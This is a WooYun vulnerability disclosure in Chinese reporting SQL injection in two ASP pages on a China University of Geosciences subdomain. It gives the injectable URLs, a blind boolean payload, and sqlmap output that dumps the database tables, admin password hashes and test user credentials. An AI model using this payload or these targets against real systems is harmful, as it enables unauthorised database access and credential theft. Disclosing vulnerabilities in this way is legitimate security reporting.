wybug_title: 中国地质大学旗下SQL注入(附带2处)
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail: 漏洞详情 披露状态：   									2015-01-13：	细节已通知厂商并且等待厂商处理中									2015-01-18：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： SQL注入 详细说明：  SQL注入！   漏洞证明：  注入:http://unit.cug.edu.cn/ceping/show.asp?id=1067http://unit.cug.edu.cn/ceping/list.asp?id=65sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1067 AND 8244=8244---[13:58:34] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[13:58:34] [INFO] fetched data logged to text files under 'C:\Documents and Settings\Administrator\.sqlmap\output\unit.cug.edu.cn'[*] shutting down at 13:58:34Database: Microsoft_Access_masterdb[10 tables]+----------+| user     || admin    || download || feedback || market   || news     || photo    || product  || survey   || vote     |+----------+Database: Microsoft_Access_masterdbTable: admin[5 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| author   | non-numeric || id       | numeric     || link     | non-numeric || password | non-numeric || sub      | non-numeric |+----------+-------------+Database: Microsoft_Access_masterdbTable: admin[2 entries]+----+-----+------+--------+------------------+| id | sub | link | author | password         |+----+-----+------+--------+------------------+| 1  | <blank> | #    | <blank> | 49ba59abbe56e057 || 19 | <blank> | #    | <blank> | c8e331e440468a7d |+----+-----+------+--------+------------------+Database: Microsoft_Access_masterdbTable: user[12 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| author   | non-numeric || email    | non-numeric || homepage | non-numeric || id       | numeric     || link     | non-numeric || logins   | numeric     || password | non-numeric || phone    | non-numeric || question | non-numeric || sub      | non-numeric || userid   | numeric     || username | non-numeric |+----------+-------------+Database: Microsoft_Access_masterdbTable: user[2 entries]+----------+----------+| username | password |+----------+----------+| test     | test     || test1    | test1    |+----------+----------+等！   修复方案：  过滤！   版权声明：转载请注明来源 YuShen@乌云
